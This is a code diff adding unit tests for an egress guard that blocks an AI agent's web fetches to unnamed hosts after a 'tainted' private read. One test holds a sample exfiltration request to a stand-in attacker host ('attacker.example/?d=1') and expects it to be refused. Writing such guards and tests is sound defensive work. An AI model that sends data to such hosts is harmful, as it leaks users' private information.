@@ -542,3 +542,28 @@ describe("hasNonTextUserPart (review M4c, 2026-10-13)", () => {
     ).toBe(false);
   });
 });
+
+describe("createEgressGuard that starts tainted", () => {
+  it("refuses a fetch to an unnamed host before any private read, and allows a named one", () => {
+    const guard = createEgressGuard({ userText: ["read https://docs.example.org/guide"], tainted: true });
+
+    expect(guard.beforeCall("web_fetch", { url: "https://attacker.example/?d=1" })).toEqual(REFUSAL);
+    expect(guard.beforeCall("web_fetch", { url: "https://docs.example.org/guide" })).toBeNull();
+  });
+
+  it("with nothing named, allows only a host a search of this run returned", () => {
+    const guard = createEgressGuard({ userText: [], tainted: true });
+
+    expect(guard.beforeCall("web_fetch", { url: "https://found.example/page" })).toEqual(REFUSAL);
+    guard.afterCall(WEB_SEARCH, searchOutput("https://found.example/page"));
+    expect(guard.beforeCall("web_fetch", { url: "https://found.example/page" })).toBeNull();
+    expect(guard.beforeCall("web_fetch", { url: "https://other.example/" })).toEqual(REFUSAL);
+  });
+
+  it("is untainted by default and when told not to be", () => {
+    for (const options of [{ userText: [] }, { userText: [], tainted: false }]) {
+      const guard = createEgressGuard(options);
+      expect(guard.beforeCall("web_fetch", { url: "https://anywhere.example/" })).toBeNull();
+    }
+  });
+});
